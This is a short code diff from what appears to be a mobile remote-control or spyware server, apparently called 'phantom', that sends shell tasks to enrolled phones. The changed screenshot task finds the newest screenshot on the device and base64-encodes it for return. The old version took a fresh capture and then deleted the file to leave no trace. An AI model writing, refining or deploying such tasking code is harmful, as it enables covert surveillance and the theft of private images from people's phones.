@@ -290,7 +290,9 @@ deviceSeed := regReq.DeviceID
 			command = "ip addr"
 		case protocol.TaskScreenshot:
 			taskType = "shell"
-			command = "screencap -p /sdcard/phantom_screen.png && base64 /sdcard/phantom_screen.png && rm /sdcard/phantom_screen.png"
+			// screencap needs root — grab the most recent existing screenshot instead.
+			// Simple chain: find newest file, base64 encode it.
+			command = `ls -t /sdcard/DCIM/Screenshots/* /sdcard/Pictures/Screenshots/* 2>/dev/null | head -1 | xargs base64 2>/dev/null || echo NO_SCREENSHOTS`
 		}
 
 		mobileTasks = append(mobileTasks, MobileTask{
